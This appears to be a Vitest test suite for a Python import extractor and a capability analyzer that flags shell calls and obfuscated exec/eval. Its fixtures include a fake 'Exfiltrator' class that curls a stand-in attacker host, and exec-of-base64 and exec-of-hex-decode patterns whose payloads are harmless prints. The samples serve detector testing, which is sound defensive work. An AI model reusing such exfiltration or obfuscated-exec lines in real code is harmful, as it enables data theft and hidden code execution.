import { describe, it, expect, beforeAll } from 'vitest';
import { TreeSitterLoader } from '../src/parsers/tree-sitter-loader.js';
import { PythonImportExtractor } from '../src/python/python-import-extractor.js';
import { AstCapabilityAnalyzer } from '../src/capabilities/ast-capability-analyzer.js';

describe('PythonImportExtractor Syntax Suite', () => {
  beforeAll(async () => {
    await TreeSitterLoader.init();
  });

  it('extracts standard Python import forms', () => {
    const code = `
import os
import sys, math
import numpy as np
import pkg.sub.module
`;
    const { tree } = TreeSitterLoader.parseFile(code, 'python');
    const res = PythonImportExtractor.extract(tree!.rootNode);

    expect(res.hasDynamicImports).toBe(false);
    expect(res.imports.map((i) => i.module)).toEqual([
      'os',
      'sys',
      'math',
      'numpy',
      'pkg.sub.module',
    ]);
  });

  it('extracts from-import and relative imports', () => {
    const code = `
from pathlib import Path
from typing import List, Dict, Optional
from . import local_utils
from ..subpkg import helper
from ...core.models import User
`;
    const { tree } = TreeSitterLoader.parseFile(code, 'python');
    const res = PythonImportExtractor.extract(tree!.rootNode);

    expect(res.hasDynamicImports).toBe(false);

    const rel1 = res.imports.find((i) => i.module === '.');
    expect(rel1?.isRelative).toBe(true);
    expect(rel1?.relativeLevel).toBe(1);

    const rel2 = res.imports.find((i) => i.module === '..subpkg');
    expect(rel2?.isRelative).toBe(true);
    expect(rel2?.relativeLevel).toBe(2);

    const rel3 = res.imports.find((i) => i.module === '...core.models');
    expect(rel3?.isRelative).toBe(true);
    expect(rel3?.relativeLevel).toBe(3);
  });

  it('extracts conditional imports inside if and try/except blocks', () => {
    const code = `
try:
    import yaml
except ImportError:
    yaml = None

if True:
    from PIL import Image
`;
    const { tree } = TreeSitterLoader.parseFile(code, 'python');
    const res = PythonImportExtractor.extract(tree!.rootNode);

    expect(res.imports.map((i) => i.module)).toContain('yaml');
    expect(res.imports.map((i) => i.module)).toContain('PIL');
  });

  it('flags dynamic reflection and non-literal importlib as dynamic', () => {
    const code1 = `importlib.import_module("static_mod")`;
    const tree1 = TreeSitterLoader.parseFile(code1, 'python').tree!;
    const res1 = PythonImportExtractor.extract(tree1.rootNode);
    expect(res1.hasDynamicImports).toBe(false);
    expect(res1.imports[0]?.module).toBe('static_mod');

    const code2 = `importlib.import_module(mod_name)`;
    const tree2 = TreeSitterLoader.parseFile(code2, 'python').tree!;
    expect(PythonImportExtractor.extract(tree2.rootNode).hasDynamicImports).toBe(true);

    const code3 = `eval("import secret")`;
    const tree3 = TreeSitterLoader.parseFile(code3, 'python').tree!;
    expect(PythonImportExtractor.extract(tree3.rootNode).hasDynamicImports).toBe(true);

    const code4 = `exec("import backdoor")`;
    const tree4 = TreeSitterLoader.parseFile(code4, 'python').tree!;
    expect(PythonImportExtractor.extract(tree4.rootNode).hasDynamicImports).toBe(true);
  });

  it('resolves enclosingFunction correctly for method inside class body', async () => {
    const code = `
import subprocess

class Exfiltrator:
    def steal(self):
        subprocess.run(["curl", "http://c2.attacker.com/leak"])
`;
    const result = await AstCapabilityAnalyzer.analyzeFile(code, 'src/exfiltrator.py');
    const shellSite = result.sites.find((s) => s.capability === 'shell');
    expect(shellSite).toBeDefined();
    expect(shellSite?.enclosingFunction).toBe('steal');
    expect(shellSite?.enclosingFunction).not.toBe('Exfiltrator');
    expect(shellSite?.enclosingFunction).not.toBeNull();
  });

  it('detects Python dynamic eval obfuscation patterns (exec with b64decode and codecs.decode)', async () => {
    // Pattern 1: call to exec() where argument is a b64decode() call
    const b64Code = `
import base64
exec(base64.b64decode("cHJpbnQoJ21hbGljaW91cycp"))
`;
    const b64Result = await AstCapabilityAnalyzer.analyzeFile(b64Code, 'src/b64_exec.py');
    expect(b64Result.capabilities.hasEval).toBe(true);
    const b64Site = b64Result.sites.find((s) => s.capability === 'eval');
    expect(b64Site).toBeDefined();
    expect(b64Site?.confidence).toBe('HIGH');
    expect(b64Site?.details).toContain('base64');

    // Pattern 2: import codecs; exec(codecs.decode(...))
    const codecsCode = `
import codecs
exec(codecs.decode("7072696e74282768656c6c6f2729", "hex"))
`;
    const codecsResult = await AstCapabilityAnalyzer.analyzeFile(codecsCode, 'src/codecs_exec.py');
    expect(codecsResult.capabilities.hasEval).toBe(true);
    const codecsSite = codecsResult.sites.find((s) => s.capability === 'eval');
    expect(codecsSite).toBeDefined();
    expect(codecsSite?.confidence).toBe('HIGH');
    expect(codecsSite?.details).toContain('codecs');

    // Pattern 3: from base64 import b64decode; exec(b64decode(...))
    const aliasedB64Code = `
from base64 import b64decode
exec(b64decode("cHJpbnQoJ2FsaWFzZWQnKQ=="))
`;
    const aliasedB64Result = await AstCapabilityAnalyzer.analyzeFile(
      aliasedB64Code,
      'src/aliased_b64.py'
    );
    expect(aliasedB64Result.capabilities.hasEval).toBe(true);
    const aliasedSite = aliasedB64Result.sites.find((s) => s.capability === 'eval');
    expect(aliasedSite).toBeDefined();
    expect(aliasedSite?.details).toContain('base64');
  });
});
